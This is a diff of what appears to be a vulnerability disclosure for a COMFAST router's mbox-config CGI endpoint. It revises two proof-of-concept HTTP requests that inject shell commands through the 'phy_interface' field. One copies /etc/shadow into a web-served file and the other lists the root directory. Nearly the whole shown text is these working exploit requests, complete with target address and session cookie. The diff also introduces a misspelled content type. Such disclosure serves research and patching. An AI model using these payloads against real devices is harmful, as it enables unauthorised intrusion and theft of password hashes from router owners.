@@ -30,18 +30,21 @@ The `phy_interface` parameter is unsanitized and used in a `system_0` call (`spr
 
 ### PoC 1: Dump `/etc/shadow`
 ```http
-POST /cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
+POST http://192.168.0.1/cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
 Host: cflogin.cn
 Content-Length: 110
-Content-Type: application/json
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
+Content-Type: appliation/json
+Origin: http://cflogin.cn
+Referer: http://cflogin.cn/index.html
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
 Cookie: COMFAST_SESSIONID=6501a8c0-ffffffc40f08ffffffaaffffff82fffffff0-2c28fa16
 Connection: close
 
-{
-  "action": "one_click_redial",
-  "phy_interface": "br-wan && cat /etc/shadow > /www-comfast/test.txt",
-  "real_num": 1
-}
+{"action":"one_click_redial","phy_interface":"br-wan && cat /etc/shadow > /www-comfast/test.txt","real_num":1}
 ```
 
 - **Steps**:
@@ -54,18 +57,21 @@ Connection: close
 
 ### PoC 2: List Root Directory (`ls /`)
 ```http
-POST /cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
+POST http://192.168.0.1/cgi-bin/mbox-config?method=SET&section=multi_pppoe HTTP/1.1
 Host: cflogin.cn
-Content-Length: 104
-Content-Type: application/json
+Content-Length: 110
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
+Content-Type: appliation/json
+Origin: http://cflogin.cn
+Referer: http://cflogin.cn/index.html
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
 Cookie: COMFAST_SESSIONID=6501a8c0-ffffffc40f08ffffffaaffffff82fffffff0-2c28fa16
 Connection: close
 
-{
-  "action": "one_click_redial",
-  "phy_interface": "br-wan && ls / > /www-comfast/test.txt",
-  "real_num": 1
-}
+{"action":"one_click_redial","phy_interface":"br-wan && ls / > /www-comfast/test.txt","real_num":1}
 
 ```
 
